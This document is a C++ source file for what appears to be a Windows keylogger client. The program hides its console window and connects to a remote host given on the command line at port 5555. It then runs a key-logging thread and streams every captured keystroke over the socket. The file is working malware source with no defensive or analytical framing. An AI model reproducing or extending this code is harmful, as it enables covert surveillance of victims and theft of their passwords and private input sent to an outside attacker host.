#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <stdlib.h>
#include <errno.h>
#include "keylogger.h"

int main(int argc, char* argv[])
{
    ShowWindow(GetConsoleWindow(), SW_HIDE); // do not show (hide) this program window

	WSADATA wsa_data;
	WSAStartup(MAKEWORD(2,2), &wsa_data);

	// resolve the local address and port to be used by the server
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	getaddrinfo(argv[1], "5555", &hints, &result);
	
	SOCKET ConnectSocket = INVALID_SOCKET;
	
	for (ptr=result; ptr != NULL; ptr=ptr->ai_next) {
		// create a socket
		ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);	
		
		std::cout << "connecting..." << std::endl;
		
		int conn_result = connect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
		if (conn_result == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
		}
	}
	
	if (ConnectSocket == INVALID_SOCKET) {
		WSACleanup();
		return 1;
	}
	
	std::cout << "connected." << std::endl;
	
	char recvbuf[2048];
	int recvbuflen = 2048;
	const char *init_msg = "Welcome to Cute!\nPress any key to stop.\n\n";
	send(ConnectSocket, init_msg, strlen(init_msg), 0);
	
	// send until the peer shuts down the connection by checking for error
	int send_result;
	// result to send through socket
	char keys_buf[30];
	// logged keys pending to be sent
	std::queue<const char*> q;
	// start keylogger thread
	std::thread thread_obj(logKeys, &q);
	do 
	{	Sleep(10);
		getKeys(&q, keys_buf);
		if (strlen(keys_buf) != 0)
		{
			send_result = send(ConnectSocket, keys_buf, strlen(keys_buf), 0);
			strcpy(keys_buf, "");
		}
	}
	while(send_result != SOCKET_ERROR);

	// cleanup
	std::cout << "exit" << std::endl;
	freeaddrinfo(result);
	shutdown(ConnectSocket, SD_SEND);
	closesocket(ConnectSocket);
	WSACleanup();
	return 0;
}
